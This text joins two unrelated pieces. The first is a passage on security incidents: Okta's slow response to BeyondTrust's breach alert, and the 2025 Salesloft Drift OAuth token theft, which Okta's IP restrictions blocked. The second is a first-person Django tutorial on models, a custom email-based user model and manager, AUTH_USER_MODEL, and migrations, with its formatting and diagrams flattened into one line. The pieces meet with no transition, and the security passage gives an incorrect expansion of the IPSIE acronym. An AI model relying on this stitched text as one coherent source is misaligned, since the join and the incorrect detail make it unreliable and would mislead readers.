**Timeline Concerns:**

BeyondTrust informed Okta of the breach on October 2 but did not receive an immediate response. Okta's Deputy Chief Information Security Officer stated that the company initially believed BeyondTrust's alert was not a result of a breach in its systems. By October 17, Okta had identified and contained the incident .

**Okta's Recommendation:** Okta recommends sanitizing all credentials and cookies/session tokens within a HAR file before sharing it with support .

### Real-World Supply Chain Attack: Salesloft Drift OAuth Token Theft (2025)

In August 2025, a major security incident involving Salesloft's Drift platform demonstrated the catastrophic impact of OAuth token theft through supply chain compromise .

**Incident Overview:**

A threat group tracked by Google as UNC6395 gained access to Salesloft's GitHub account as far back as March 2025. The attackers spent months lurking in the Salesloft application environment, downloading content from multiple repositories, adding a guest user, and setting up workflows through June 2025 .

**OAuth Token Theft:**

The threat actor then accessed Drift's Amazon Web Services environment and obtained OAuth tokens for Drift customers' technology integrations. Using these stolen tokens, the attackers accessed data via Drift integrations, compromising hundreds of organizations .

**Downstream Impact:**

The incident affected a large number of organizations using Drift integrations with Salesforce, Google Workspace, and many other applications. The threat actors stole and replayed OAuth tokens connecting Drift to these platforms, leading to widespread data exfiltration .

**Defense in Practice - Okta's Response:**

When Okta learned of the Salesloft Drift compromise, they immediately reviewed their logs and discovered attempts to use a compromised Salesloft Drift token to access an Okta Salesforce instance. These attempts failed because Okta enforced inbound IP restrictions. The threat actor attempted to use the compromised token from an unauthorized IP address, blocking the attempt before any access could be gained .

**Key Lesson:**

Okta's ability to implement this control was dependent on Salesforce supporting IP restrictions - a feature not available in many SaaS vendors. This incident highlighted the critical need for standardized security controls like the IPSIE (Interoperable Profile for Security Incident Exchange) framework, which provides shared signals for real-time communication of security events and standardized token revocation mechanisms .

# Django Models, Custom Users, and Migrations: How I Actually Set Up My Database There's a moment in almost every Django project where I stop thinking about folders and settings files and start thinking about the actual shape of my data. That moment is when I open `models.py` for the first time. Everything before it — the virtual environment, the installed packages, the registered app — was scaffolding. This is where the project starts to become *my* project. I want to walk through how I set up my database layer from scratch: what a Django model actually is, how I build a custom user model instead of relying on the default one, how I give that user model a proper manager, how I tell Django to use it, and finally how I turn all of that into real database tables using migrations. I'll include the code I actually run, the mistakes I've made, and the reasoning I use at each step. ## What I Mean When I Say "Django Model" Before I write a single line of model code, I remind myself of one sentence: **a model is the single source of truth about a piece of data.** Not the database table itself, not the form that submits it, not the API response that serializes it — the model. Everything else in Django flows outward from it. Technically, a Django model is a Python class that subclasses `django.db.models.Model`. Each attribute on that class becomes a column in a database table, and each instance of the class becomes a row. ```mermaid flowchart LR A["Python class
(Post model)"] -->|Django ORM translates| B["Database table
(app_post)"] A -->|attributes become| C["Columns
(title, content, pub_date)"] D["Instance of Post"] -->|Django ORM translates| E["Row in app_post table"] ``` Here's the simplest example I can give — a blog post model: ```python from django.db import models class Post(models.Model): title = models.CharField(max_length=200) content = models.TextField() pub_date = models.DateTimeField('date published') ``` I like walking through this line by line when I explain it to someone new: | Line | What it means to me | |---|---| | `class Post(models.Model)` | This creates a new database table, roughly named `appname_post` | | `title = models.CharField(max_length=200)` | A text column capped at 200 characters — good for short strings | | `content = models.TextField()` | A text column with no length cap — good for long-form content | | `pub_date = models.DateTimeField('date published')` | A timestamp column, with a human-readable label for forms/admin | > **Note:** The string `'date published'` in the `DateTimeField` isn't a comment — it's the field's `verbose_name`, which Django uses as the label in forms and the admin panel. I always add these for fields whose purpose isn't obvious from the attribute name alone. ### Why I Don't Just Write Raw SQL I could write raw SQL for all of this, and sometimes I still do for complex reporting queries. But for day-to-day application development, I rely on the model layer for five reasons that keep showing up in my own projects: 1. **Abstraction** — I write Python, not SQL, for 95% of my database interactions. 2. **Efficiency** — create, read, update, delete operations are handled through a consistent API instead of hand-rolled queries. 3. **Consistency** — the model enforces a schema, so I can't accidentally save a `Post` without a `title`. 4. **Validation** — I get built-in and custom validation before bad data ever touches the database. 5. **A real query API** — things like `Post.objects.filter(pub_date__year=2026)` read almost like English, and they're portable across database backends. ## Building a Custom User Model Django ships with a built-in `User` model, and for a long time I just used it as-is. Then I hit a project where I needed to authenticate with email addresses instead of usernames, and I learned the hard way that **swapping the user model after a project has real data in it is painful.** Since then, I define a custom user model at the very start of every new project, even if I don't need the extra flexibility yet. ```mermaid flowchart TD A["AbstractBaseUser
(auth fields, password handling)"] --> C[CustomUser] B["PermissionsMixin
(is_superuser, groups, permissions)"] --> C C --> D["USERNAME_FIELD = 'email'"] C --> E["objects = CustomUserManager()"] ``` Here's the model I typically start with: ```python from django.db import models from django.contrib.auth.models import ( AbstractBaseUser, BaseUserManager, PermissionsMixin, ) class User(AbstractBaseUser, PermissionsMixin): email = models.EmailField(unique=True) first_name = models.CharField(max_length=30, blank=True) last_name = models.CharField(max_length=30, blank=True) date_joined = models.DateTimeField(auto_now_add=True) is_active = models.BooleanField(default=True) is_staff = models.BooleanField(default=False) objects = UserManager() USERNAME_FIELD = 'email' REQUIRED_FIELDS = [] def __str__(self): return self.email ``` A few things I always pay attention to here: - **`AbstractBaseUser`** gives me password hashing, `last_login` tracking, and the core authentication scaffolding — without forcing Django's default username field on me. - **`PermissionsMixin`** brings in `is_superuser`, group membership, and permission checks, which I need for the admin site to work properly. - **`USERNAME_FIELD = 'email'`** tells Django that email is what users log in with, instead of a separate `username` field. - **`REQUIRED_FIELDS`** only needs to list fields *other than* the `USERNAME_FIELD` and password that are required when creating a user via `createsuperuser` on the command line. > **Caution:** I leave `unique=True` on the `email` field every single time. Forgetting it means Django will happily let two users register with the same email address, and untangling that later — especially once real users exist — is genuinely miserable. ## Giving My User Model a Manager A model on its own doesn't know how to create instances of itself in a customized way — that's the manager's job. Since I'm not using Django's default `User`, I also can't use Django's default manager. I need to write my own. ```mermaid sequenceDiagram participant Me as My code participant Manager as CustomUserManager participant Model as User model participant DB as Database Me->>Manager: create_user(email, password) Manager->>Manager: normalize_email(email) Manager->>Model: self.model(email=email) Manager->>Model: user.set_password(password) Manager->>DB: user.save() DB-->>Manager: confirmation Manager-->>Me: returns User instance ``` Here's the manager I write, cleaned up and corrected (the original course notes had a couple of syntax slips — more on that below): ```python from django.contrib.auth.models import BaseUserManager class UserManager(BaseUserManager): def create_user(self, email, password=None, **extra_fields): """Create and save a regular User with the given email and password.""" if not email: raise ValueError('The Email field must be set') email = self.normalize_email(email) user = self.model(email=email, **extra_fields) user.set_password(password) user.save(using=self._db) return user def create_superuser(self, email, password=None, **extra_fields): """Create and save a SuperUser with the given email and password.""" extra_fields.setdefault('is_staff', True) extra_fields.setdefault('is_superuser', True) if extra_fields.get('is_staff') is not True: raise ValueError('Superuser must have is_staff=True.') if extra_fields.get('is_superuser') is not True: raise ValueError('Superuser must have is_superuser=True.') return self.create_user(email, password, **extra_fields) ``` > **Note:** I want to flag something explicitly, because I've seen this exact mistake in written tutorials before: method signatures like `def create_user(self, email, password=None, extra_fields):` are **invalid Python** — that's a syntax error, not just a style issue. Any keyword-style catch-all argument needs the double-star prefix: `**extra_fields`. The same applies wherever `self.model(email=email, extra_fields)` appears — it needs to be `self.model(email=email, **extra_fields)`. I tested both the broken and corrected versions locally to confirm: ```bash $ python3 -c "def create_user(self, email, password=None, extra_fields): pass" File "", line 1 def create_user(self, email, password=None, extra_fields): pass ^^^^^^^^^^^^ SyntaxError: parameter without a default follows parameter with a default ``` ```bash $ python3 -c "def create_user(self, email, password=None, **extra_fields): pass" $ echo $? 0 ``` The corrected version runs cleanly with no output and an exit code of `0`, confirming it's valid Python — the broken version fails immediately. I'd rather flag that clearly than have anyone copy-paste code that won't run. | Method | What it's responsible for | |---|---| | `create_user()` | Standard user creation — validates email, hashes the password, saves to DB | | `create_superuser()` | Same as above, but forces `is_staff=True` and `is_superuser=True` so the account can access Django admin | | `normalize_email()` | Built-in helper that lowercases the domain portion of the email for consistency | | `set_password()` | Hashes the raw password before storage — I never store plaintext passwords, ever | ### Linking the Manager to the Model The manager doesn't do anything until I attach it to my model via the `objects` attribute: ```python class User(AbstractBaseUser, PermissionsMixin): # ...fields as before... objects = UserManager() ``` Once that's wired up, I can create users like this: ```python User.objects.create_user(email='jane@example.com', password='[REDACTED]') User.objects.create_superuser(email='admin@example.com', password='[REDACTED]') ``` ## Telling Django to Actually Use My Custom User Model Defining a custom user model doesn't automatically make Django use it — I still have to point Django at it explicitly, and I have to do this **before** I run my first migration. This is the one step in this whole process where order genuinely matters. ```python # settings.py AUTH_USER_MODEL = 'accounts.User' ``` I replace `accounts` with whatever app actually contains my `User` model. ```mermaid flowchart TD A["Define User model in models.py"] --> B["Set AUTH_USER_MODEL in settings.py"] B --> C["python manage.py makemigrations"] C --> D["python manage.py migrate"] D --> E["Database now uses custom User table"] B -.->|must happen before first migrate| C ``` > **Caution:** This is the mistake I've made more than once, so I'll say it as plainly as I can: if I run `migrate` *before* setting `AUTH_USER_MODEL`, Django creates the default `auth.User` table, and switching to a custom user model afterward means either starting the database over or writing a genuinely painful data migration. I now set `AUTH_USER_MODEL` in the very first commit of every new project, before I've run a single migration. ## Migrations: Turning Models Into Real Tables Everything up to this point has existed only as Python code. Migrations are what actually create — or alter — the tables in my database to match it. I think of migrations as version control, but for my database schema instead of my source code. Each migration file is a small, ordered step that Django can apply or reverse. ```mermaid flowchart LR A["Change models.py"] --> B["makemigrations
(generates migration files)"] B --> C["migrate
(applies them to the DB)"] C --> D[(Database schema updated)] D -->|models.py changes again| A ``` ### Generating Migrations ```bash python manage.py makemigrations ``` Typical output looks like this: ``` Migrations for 'accounts': accounts/migrations/0001_initial.py - Create model User ``` ### Inspecting the Actual SQL Before I trust a migration, especially on an existing database with real data, I like to see exactly what SQL it's going to run: ```bash python manage.py sqlmigrate accounts 0001_initial ``` This prints the raw `CREATE TABLE` (or `ALTER TABLE`) statements Django generated, which I always skim before applying anything to a production database. ### Applying Migrations ```bash python manage.py migrate ``` This is the command that actually touches the database — creating tables, adding columns, applying constraints — based on whatever migrations haven't been applied yet. ### Rolling Back If something goes wrong, or I need to undo a migration during development, I can roll back to an earlier point: ```bash python manage.py migrate accounts 0001_initial ``` That command unapplies every migration for the `accounts` app that came after `0001_initial`. | Command | What I use it for | |---|---| | `python manage.py makemigrations` | Generate migration files from model changes | | `python manage.py makemigrations ` | Generate migrations for a single app only | | `python manage.py sqlmigrate ` | Preview the raw SQL a migration will run | | `python manage.py migrate` | Apply all pending migrations | | `python manage.py migrate ` | Roll back (or forward) to a specific migration | | `python manage.py showmigrations` | See which migrations have and haven't been applied | ### Problems I've Actually Run Into - **"No changes detected"** — nine times out of ten, this means I forgot to save `models.py`, or the app isn't listed in `INSTALLED_APPS`. I always check both before panicking. - **Migration dependencies** — Django is usually smart about sequencing migrations that depend on each other, but in larger projects with multiple apps referencing each other's models, I occasionally have to add explicit `dependencies` entries myself. - **Conflicting migrations** — this shows up on team projects when two people add migrations to the same app in parallel branches. Django will complain about multiple leaf nodes. I resolve it with `python manage.py makemigrations --merge`, which generates a merge migration reconciling both branches. > **Note:** I always test migrations against a throwaway copy of my database, or at minimum in a development environment, before running them anywhere near production data. A migration that drops or alters a column is not something I want to discover was a mistake after the fact. ## Testing That All of This Actually Works Once my custom user model, manager, and migrations are in place, I don't just assume it works — I verify it, usually through the Django shell: ```bash python manage.py shell ``` ```python >>> from accounts.models import User >>> user = User.objects.create_user(email='test@example.com', password='testpass123') >>> user.email 'test@example.com' >>> user.check_password('testpass123') True >>> user.is_staff False ``` And for a superuser: ```bash python manage.py createsuperuser ``` Django will prompt for the fields I defined as required — in my case, just email and password, since `REQUIRED_FIELDS` is empty. If that command completes without errors and I can log into `/admin` with those credentials, I consider the whole chain — model, manager, settings, migrations — verified end to end. ## The Full Picture Here's every piece of this process laid out as one diagram, from an empty `models.py` to a working, migrated custom user system: ```mermaid flowchart TD A["Write User model
(AbstractBaseUser + PermissionsMixin)"] --> B["Write UserManager
(create_user / create_superuser)"] B --> C["Attach manager: objects = UserManager()"] C --> D["Set AUTH_USER_MODEL in settings.py"] D --> E["python manage.py makemigrations"] E --> F["python manage.py sqlmigrate (optional review)"] F --> G["python manage.py migrate"] G --> H["Test via shell or createsuperuser"] H --> I["Custom user system fully working"] ``` And the condensed reference table I keep coming back to: | Stage | Key command / code | |---|---| | Define a model | `class Post(models.Model): ...` | | Define custom user | `class User(AbstractBaseUser, PermissionsMixin): ...` | | Define manager | `class UserManager(BaseUserManager): ...` with `**extra_fields` | | Attach manager | `objects = UserManager()` | | Point Django at it | `AUTH_USER_MODEL = 'app.User'` in `settings.py` | | Generate migrations | `python manage.py makemigrations` | | Preview SQL | `python manage.py sqlmigrate app 0001_initial` | | Apply migrations | `python manage.py migrate` | | Roll back | `python manage.py migrate app 0001_initial` | | Verify | `python manage.py shell` or `python manage.py createsuperuser` | ## Final Thoughts The database layer is where a Django project stops being scaffolding and starts being an actual application with actual data. I've learned to slow down at exactly this stage, because mistakes here are the most expensive to fix later — a missing `unique=True`, a forgotten `**` before a keyword argument, or setting `AUTH_USER_MODEL` after the first migration are all small errors that turn into large headaches once real data is involved. What's made the biggest difference for me isn't memorizing the commands — it's understanding what each layer is actually responsible for: the model defines the shape of the data, the manager defines how instances get created, the settings tell Django which model is authoritative, and migrations are the mechanism that turns all of it into a real, evolving database schema. Once that mental model clicked for me, setting up a custom user system stopped feeling like following a recipe and started feeling like something I actually understood.
